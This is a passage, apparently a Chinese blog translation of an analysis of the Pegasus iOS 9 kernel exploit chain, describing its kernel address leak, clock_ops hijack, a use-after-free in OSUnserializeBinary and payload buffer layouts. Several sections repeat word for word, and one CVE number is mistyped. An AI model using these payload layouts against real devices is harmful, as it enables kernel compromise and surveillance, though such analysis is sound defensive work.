class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 1</span></span><br><span class="line">	<span class="comment">//kOSSerializeNumber specified as 0x800 bits (256 bytes)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(4)</span></span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//KEY 2 specified as bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">&quot;HIDKeyboardModifierMappingDst&quot;</span>,<span class="number">0x00</span>,    <span class="comment">//(30 chars)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 2</span></span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeNumber | 32</span></span><br><span class="line">	<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x84</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(0x193)</span></span><br><span class="line">	<span class="number">0x93</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>阶段二调用<em>IORegistryEntryGetProperty <em>来找到</em>HIDKeyboardModifierMappingSrc</em>的入口点，导致<strong>properties</strong>数组创建了超过最大值64bit的<strong>OSNumber</strong>值。阶段二用下列代码调用<em>is_ io_registry_entry_get_property_bytes</em>，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着<strong>IORegistryEntryGetProperty</strong>这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;<span class="keyword">while</span> (IORegistryEntryGetProperty_0(v13, <span class="string">&quot;HIDKeyboardModifierMappingSrc&quot;</span>,dataBuffer,&amp;size)</span><br><span class="line">);</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">&quot;%.2s%5.5d\n&quot;</span>,<span class="string">&quot;kaslr.c&quot;</span>,<span class="number">127</span>);</span><br><span class="line"><span class="keyword">if</span>(size&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">	writeLog(<span class="number">7</span>,<span class="string">&quot;%.2s%5.5d\n&quot;</span>,<span class="string">&quot;kaslr.c&quot;</span>,<span class="number">138</span>);</span><br><span class="line">	<span class="keyword">return</span> dataBuffer[index]&amp;<span class="number">0xFFF00000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要特别注意这段代码的两个方面。第一，properties数组指定<strong>OSNumber</strong>的值是256字节大小，这个值会最终导致数据泄露。第二，<em>index</em>值会因型号和iOS版本不同而不同，这个值存储在<em>dataBuffer</em>中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定<em>dataBuffer</em>那个地址值是有效的内核地址。</p>
<p>如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。</p>
<h4 id="在受害设备上建立读-写-执行原语（32bit）"><a href="#在受害设备上建立读-写-执行原语（32bit）" class="headerlink" title="在受害设备上建立读/写/执行原语（32bit）"></a>在受害设备上建立读/写/执行原语（32bit）</h4><p>找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过<strong>host_get_clock_service</strong>得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。</p>
<p>紧跟着<em>pipe</em>和<em>host_get_clock_service calls</em>，32包检查向前通过<strong>task_from_pid</strong>创建的内核端口值。如果<strong>task_from_pid</strong>返回了一个有效值（不是NULL），32包用<em>vm_write</em>写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了<em>clock_ops</em>的一部分。</p>
<p>当调用例如<em>clock_get_attributes</em>函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的<em>getattr</em>操作语。特别的是，实时时钟的<em>getattr</em>被修改成指向<strong>OSSerializer::serialize</strong>的指针，电池时钟的<em>getattr</em>改成指向<strong>_bufattr_cpx</strong>的指针。</p>
<p>当两个时钟调用<em>clock_get_attributes</em>时，会改变其原有的执行结果。例如电池时钟调用<em>clock_get_attributes</em>时，相当与调用了内核空间读函数。<strong>_bufattr_cpx</strong>只有两个属性：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_bufattr_cpx:</span><br><span class="line">			LDR        R0,[R0]</span><br><span class="line">			BX          LR</span><br></pre></td></tr></table></figure>

<p>R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然<strong>getattr</strong>使用了三个参数，但缺少完全兼容的函数原型没有关系。</p>
<p>替代了实时时钟<strong>getattr</strong>的函数更加复杂。<strong>OSSerializer::serialize</strong>函数将<em>OSSerializer <em>对象（包含虚函数表（vtable））作为</em>this</em>指针。函数调用* OSSerializer *对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD <span class="title">OSSerializer::serialize</span><span class="params">(OSSerialize *)</span>:</span></span><br><span class="line">		LDR      R3,[R0,#8]</span><br><span class="line">		MOV    R2,R1</span><br><span class="line">		LDR      R1,[R0,#<span class="number">0xC</span>]</span><br><span class="line">		LDR.W  R12,[R0,#<span class="number">0x10</span>]</span><br><span class="line">		MOV     R0,R3</span><br><span class="line">		BX         R12</span><br></pre></td></tr></table></figure>
<p>通过一段特殊设计的数据块，接下来会详细谈到，现在调用<em>clock_get_attributes</em>就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。</p>
<p>如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。</p>
<p>64位包不会利用已越狱手机上的后门。</p>
<h4 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h4><p>为在内核中执行任意代码，最终阶段二会利用一个UFA（use after free）漏洞。当间接引用的内存区域（漏洞想要控制的）在漏洞利用开始前分配给了另一个线程，这时竞争状况产生了。其他线程可能突然申请一段重要的已释放区域，为降低这种可能性，阶段二会创建非常多的线程，并立刻将每个线程（主线程之外的）暂停。接着，阶段二为主线程修改时刻表策略，使利用UAF时不会碰到内存竞争占用的情况的可能性大大增加。</p>
<p>阶段二64位版本中还有额外的一个步骤。在线程时刻表修改完成后，阶段二会创建1000个线程。每个线程都含有一个单紧环，这个循环等待全局变量降至预定义值以下（值小于0）。这是为了确保（至少，增加可能性）没有其他的线程会争夺UFA目标内存块。</p>
<h4 id="建立通信隧道（32位）"><a href="#建立通信隧道（32位）" class="headerlink" title="建立通信隧道（32位）"></a>建立通信隧道（32位）</h4><p>阶段二32包利用pipe命令创建另一个<em>pipe</em>，重新使用原先生成的<em>pipe</em>的变量。在调用<em>host_get_clock_service</em>之后，这个命令立刻执行，以获得实时和电池时钟。因这个pipe，<em>host_get_clock_service</em>再使用了之前为获得不同时钟端口<em>host_get_clock_service</em>使用的变量。</p>
<p>先前生成的<em>pipe</em>和时钟端口非常关键，因为接下来的内核操作会用到，如果内核任务端口早已可得，<strong>32Stage2</strong>会略过这个对修改内核很重要的过程而是直接调用<em>vm_write</em>来修改内核。然而，如果<strong>32Stage2</strong>没有得到内核任务端口（手机没有越狱的情况），漏洞利用就很重要。作为攻击的一部分，32Stage2在攻击前向要获得<em>pipe</em>组和时钟，因此二进制包可以确保获得。尽管没必要重复，这是为确保重要的对象可达。</p>
<p>假定用于最终调用函数的触发机制只不过是将现有函数指针重定向到sysctl处理程序，64位包不用执行这一步骤。</p>
<h4 id="payload构造和内核插入"><a href="#payload构造和内核插入" class="headerlink" title="payload构造和内核插入"></a>payload构造和内核插入</h4><p>如果不能通过内核端口修改内核存储空间，<strong>32Stage2</strong>必须利用iOS已存漏洞去控制内核。其构造了两个数据缓冲块：包含修改实时和电池时钟的20字节的关键覆盖数据和38字节的一段payload，会运行一系列小程序来安装时钟覆盖程序。如下：<br><strong>clock_ops_overwrite</strong> 缓存区：</p>
<pre><code>[00] (rtclock.getattr):address of OSSerializer::serialize
[04] (calend_config):NULL
[08] (calend_init):NULL
[0C] (calend_gettime):address of calen_gatattr
[10] (calend_getattr):address of _bufattr_cpx</code></pre>
<p><strong>uaf_payload_buffer</strong>攻击利用的缓存区：</p>
<pre><code>[00] ptr to clock_ops_overwrite buffer
[04] address of clock_ops array in kern memory
[08] address of _copyin
[0C] NULL
[10] address of OSSerializer::serialize
[14] address of &quot;BX LR&quot; code fragment
[18] NULL
[1C] address of OSSymbol::getMetaClass
[20] address of &quot;BX LR&quot; code fragment
[24] address of &quot;BX LR&quot; code fragment</code></pre>
<p><strong>32Stage2</strong>创建一个新线程来处理安装一新的时钟处理程序所需要的初始操作，但这个新线程不会进行安装。这个线程在栈上创建<strong>kauth_filesec</strong>数据块：</p>
<pre><code>.fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D
.fsec.owner=&lt;undetermind, random stack value&gt;;
.fsec.group=&lt;undetermind, random stack value&gt;;
.fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1</code></pre>
<p><em>uaf_payload_buffer</em>添加到<em>kauth _filesec</em>中的*<em>kauth_filesec.fsec_acl.acl_ace[]**数组末尾处。这个会在IOKit上开设一个端口，为AppleKeyStore调用I</em>OServiceGetMatchingService*。该线程利用与获取内核地址相同的方法，获得一段有效的内核内存空间。新线程和之前相同操作不同之处在于属性名称不同（新线程使用“ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara”）。</p>
<p>接着，<strong>open_extended *<em>调用</em>syscall*。32包将锁定文件的地址传到syscall，还有KAUTH_UID_NONE和KAUTH_GID_NONE两个参数值，在线程开始时，创建</strong>kauth_filesec<strong>。</strong>open_extended**会执行下列代码：</p>
<pre><code>if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp;
    ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0))</code></pre>
<p><strong>kauth_copyinfilesec</strong>从用户块中复制<strong>kauth_filesec **到内核块中的</strong>kauth_filesec <strong>数据块中。</strong>kauth_filesec **制作了一个访问控制列表(acl)包含访问控制入口(ace)。如下：</p>
<pre><code>/* FILE SECURITY information */
struct kauth_filesec&#123;
    u_int32_t        fsec_magic;
    guid_t            fsec_owner;
    guid_t            fsec_group;
    struct kauth_acl fsec_acl;
&#125;；</code></pre>
<p>ACL储存在<strong>kauth_acl</strong> ，如下：</p>
<pre><code>/* Access Contro List */
struct kauth_acl&#123;
    u_int32_t        acl_entrycount;
    u_int32_t        acl_flags;
    struct kauth_ace acl_ace[1];
&#125;;</code></pre>
<p><strong>kauth_ace</strong>有24字节，如下：</p>
<pre><code>typedef u_int32_t kauth_ace_rights_t;
/* Access Control List Entry (ACE) */
struct kauth_ace&#123;
    guid_t        ace_applicable;
    u_int32_t    ace_flags;
    kauth_ace_rights_t    ace_rights;                    /*scope specific*/
&#125;;</code></pre>
<p><strong>kauth_acl</strong>里的<strong>acl_entrycount</strong>是一个无符号整型，定义了acl_ace数组里有多少个<strong>kauth_ace</strong>入口。如果ACL里没有ACE记录，acl_entrycount会定义为KAUTH_FILESEC_NOACL，这个值为-1。在<strong>kauth_copyinfilesec</strong>中发现如下注释。</p>
<pre><code>/* 
    猜测filesec的大小。从基指针开始，
    看看还有页面上还有多少空间剩余，
    裁剪到合理的上界。如果空间不够，
    重新基于实际ACL空间大小定义，重新开始。

    上届值必须小于KAUTH_ACL_MAX_ENTRIES。
    但可任意取值，0也可以。
*/</code></pre>
<p>当该线程构建了kauth_filesec，会直接操控栈上的数据块地址，如下：</p>
<pre><code>//get stack address
p=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000;
//kauth_filesec.fsec_magic
(p+0xEC0)=0x12CC16D;
//kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL
(p+0xEE4)=-1;
//kauth_filesec.fsec_acl.acl_ace[...]
memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128);</code></pre>
<p>堆栈在新线程执行开始时内容如下：</p>
<pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1
unsigned int size; //[sp+2020h] [bp-2013h]@12
char buffer[4096]; //[sp+2024h] [bp-102h]@12
int v26; //[sp+3024h] [bp-2Ch]@7
mach_port_t connection; //[sp+3028h] [hp-28h]@4
kern_return_t result; //[sp+320Ch] [bp-24h]@4
mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre>
<p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended <em>加载</em>kauth_filesec</em>时，其不会解析<em>acl _ flags <em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终</em>open_extended</em>会将攻击缓冲区（以及*clock _ ops _ overwrite *缓冲区）的内容复制到内核区域中。</p>
<p>新线程利用<em>open_extended <em>的漏洞将未修改的</em></em>payload<strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到</strong>payload<strong>的地址。当完成了对</strong>AppleKeyStore*<em>漏洞的攻击，</em>buffer <em>变量传向</em>io_service_open_extended <em>（位于stackAnchor附近的相同变量）。这意味着</em>AppleKeyStore <em>会返回指向内核块的指针，指针指向</em>open_extended *复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p>
<p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p>
<p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p>
<h4 id="payload结构和内核插入（64位）"><a href="#payload结构和内核插入（64位）" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl <em>处理函数，最终也会导致</em></em> OSSerializer::serialize<strong>以32位相似方式执行。为建立执行原语，64位用到了</strong>net.inet.ip.dummynet.extract_heap*<em>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和</em>getattr*差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p>
<h4 id="建立内核读-写基元（32位）"><a href="#建立内核读-写基元（32位）" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p>
<p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p>
<p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p>
<pre><code>len = (key &amp; kOSSerializeDataMask);
...
switch ( kOSSerializeTypeMask &amp; key)
&#123;
    case kOSSerializeDictionary:
        o = newDict = OSDictionary::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeArray:
        o = newArray =OSArray::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeSet:
        o = newSet = OSSet::withCapacity(len);
        newCollect = (len!=0);
    case kOSSerializeObject;
        if(len&gt;=objsIdx) break;
        o = objsArray[len];
        o-&gt;retain();
        isRef = true;
        break;
&#125;</code></pre>
<p>堆栈在新线程执行开始时内容如下：</p>
<pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1
unsigned int size; //[sp+2020h] [bp-2013h]@12
char buffer[4096]; //[sp+2024h] [bp-102h]@12
int v26; //[sp+3024h] [bp-2Ch]@7
mach_port_t connection; //[sp+3028h] [hp-28h]@4
kern_return_t result; //[sp+320Ch] [bp-24h]@4
mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre>
<p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended <em>加载</em>kauth_filesec</em>时，其不会解析<em>acl _ flags <em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终</em>open_extended</em>会将攻击缓冲区（以及*clock _ ops _ overwrite *缓冲区）的内容复制到内核区域中。</p>
<p>新线程利用<em>open_extended <em>的漏洞将未修改的</em></em>payload<strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到</strong>payload<strong>的地址。当完成了对</strong>AppleKeyStore*<em>漏洞的攻击，</em>buffer <em>变量传向</em>io_service_open_extended <em>（位于stackAnchor附近的相同变量）。这意味着</em>AppleKeyStore <em>会返回指向内核块的指针，指针指向</em>open_extended *复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p>
<p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p>
<p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p>
<h4 id="payload结构和内核插入（64位）-1"><a href="#payload结构和内核插入（64位）-1" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl <em>处理函数，最终也会导致</em></em> OSSerializer::serialize<strong>以32位相似方式执行。为建立执行原语，64位用到了</strong>net.inet.ip.dummynet.extract_heap*<em>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和</em>getattr*差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p>
<h4 id="建立内核读-写基元（32位）-1"><a href="#建立内核读-写基元（32位）-1" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p>
<p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p>
<p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p>
<pre><code>len = (key &amp; kOSSerializeDataMask);
...
switch ( kOSSerializeTypeMask &amp; key)
&#123;
    case kOSSerializeDictionary:
        o = newDict = OSDictionary::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeArray:
        o = newArray =OSArray::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeSet:
        o = newSet = OSSet::withCapacity(len);
        newCollect = (len!=0);
    case kOSSerializeObject;
        if(len&gt;=objsIdx) break;
        o = objsArray[len];
        o-&gt;retain();
        isRef = true;
        break;
&#125;</code></pre>
<p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p>
<p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p>
<pre><code>if (! isRef)
&#123;
        setAtIndex (objs, objsIdx, o);
        if ( !ok) break;
        objsIdx++;
&#125;</code></pre>
<p><strong>setAtIndex</strong>是一个宏，将对象（o）添加到objsArray。虽然iOS环境中存在更强大的数组对象，例如OSArray（会自动处理引用计数的数组容器），但<em>OSUnserializeBinary</em>对其已反序列化的对象的数组对象管理采用手动多一些的管理方式。反序列化后，通过调用o-&gt; release（）来将对象的引用计数清零，在大多数情况下将导致对象被释放。可能会在<em>kOSSerializeObject</em>对象中抛出异常。</p>
<p>由于<em>kOSSerializeObject</em>对象是一个表示被其他条目引用的对象，因此必须在序列化后保留该对象。因此，在反序列化期间，kOSSerializeObject对象将调用o-&gt; retain（），从而增加对象的引用计数并防止从内存中删除它。</p>
<p>序列化数据blob允许多次使用相同的密钥。 换句话说，有可能（直到iOS 9.3.1，在CVE-2016-1828中修复了重复密钥问题）使XML代码如下：</p>
<pre><code>&lt;dict&gt;
        &lt;key&gt;KEY1&lt;/key&gt;
        &lt;number&gt;1&lt;/number&gt;
        &lt;key&gt;KEY1&lt;/key&gt;
        &lt;string&gt;2&lt;/string&gt;
&lt;/dict&gt;</code></pre>
<p>上面的XML一旦序列化，将包含五个对象。第一个对象是字典容器（<code>&lt;dict&gt;</code>表示kOSSerializeDictionary对象），后跟表示键的符号（“KEY1”赋给kOSSerializeSymbol）及其数据对象（整数1赋给kOSSerializeNumber）。第四个属性指定另一个密钥对象，会再次分配给KEY1，现在这个属性是一个包含字符串“2”的字符串对象（kOSSerializeString）。作为反序列化过程的一部分，KEY1的重用导致接下来的对象会替换分配给KEY1的原始值。用新数据替换密钥便是<em>OSUnserializeBinary</em>容易受到攻击的地方。</p>
<p>如前所述，当对象被反序列化时，只要该对象不是kOSSerializeObject，该对象就存储在objsArray中以供之后引用。此存储是setAtIndex宏的结果，如下：</p>
<pre><code>#define setAtIndex(v, idx, o) \
        if (idx &gt;= v##Capacity) \
        &#123; \
                unint32_t ncap = v##Capacity+64; \
                typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \
                if (!nbuf) ok =false; \
                if(v##Array) \
                &#123; \
                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \
                        kfree(v##Array,v##Capacity * sizeof(o)); \
                &#125; \
                v##Array=nbuf; \
                v##Capacity=ncap; \
        &#125; \
        if (ok) v##Array[idx]=o;</code></pre>
<p>宏将扩展objsArray以容纳附加对象，并将对象分配到objsArray的末尾，而不通过o-&gt; retain（）调用增加其引用计数。此方法的问题在于，当第二个对象替换现有对象时（在我们的示例中，就是每当字符串对象替换KEY1的数字对象时），第一个对象被释放并随后被释放，但是指向现在释放的对象的指针存在于objsArray中。通常这只是一个糟糕的编程设计问题，但如果通过kOSSerializeObject条目引用该对象，则问题会变得更加复杂。如果kOSSerializeObject条目通过索引引用已释放对象的指针，则对o-&gt; retain（）的调用将尝试执行受攻击者控制的虚函数。</p>
<p>为了利用UAF漏洞，32Stage2必须控制已解除分配的内存位置，并放置一个自定义vtable，它将使retain条目指向自己选择的函数。安装自定义vtable需要访问两个已释放的相邻内存位置。由于在序列化过程中无法直接覆盖对象的vtable，通过分配然后释放两个内存位置，32Stage2可以使用OSData或OSString对象一次替换两个内存位置，其中一个内存位置包含恶意vtable。导致UAF漏洞的上述条件是CVE-2016-18284的结果，并且存在于9.0到9.3.1的iOS版本中。32Stage2通过使用以下payload来利用此漏洞，以便在iOS时钟处理程序中安装内核读/写原语。   </p>
<pre><code>[0x00] kOSSerailizeBinarySignature
[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10
[0x08] kOSSerailizeString | 4
[0x0C] &quot;sy2&quot;
[0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10
[0x14] kOSSerailizeDictionary | 0x10
[0x18] kOSSerailizeSymbol | 4
[0x1C] &quot;sy1&quot;
[0x20] kOSSerailizeData | 0x14
[0x24] &quot;ffff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;
[0x38] kOSSerailizeSymbol | 4
[0x3C] &quot;sy1&quot;
[0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4
[0x44] &quot;sy1&quot;
[0x48] kOSSerailizeString | 0x1C
[0x4C] &#123;payload buffer&#125;
[0x68] kOSSerailizeString | 0x1C
[0x6C] &#123;payload buffer&#125;
[0x88] kOSSerailizeString | 0x1C
[0x8C] &#123;payload buffer&#125;
[0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5</code></pre>
<p>在payload中，32Stage2重用sy1密钥以通过UAF漏洞激活payload。</p>
<p>从iOS版本9.3.2开始，修补了CVE-2016-1828漏洞，这迫使需要一种不同的机制来安装内核读/写原语。但是，OSUnserializeBinary的kOSSerializeObject仍包含UAF漏洞。</p>
<p>理解这个概念的最简单方法是查看32Stage2生成的payload，以利用OSUnserializeBinary UAF漏洞。</p>
<p>对于iOS版本9.3.2至少9.3.3，payload采用以下形式：</p>
<pre><code>[0x00] kOSSerailizeBinarySignature
[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10
[0x08] kOSSerializeString | 4
[0x0C] &quot;sy2&quot;
[0x10] kOSSerializeData | 0x14
[0x14] &#123;payload buffer&#125;
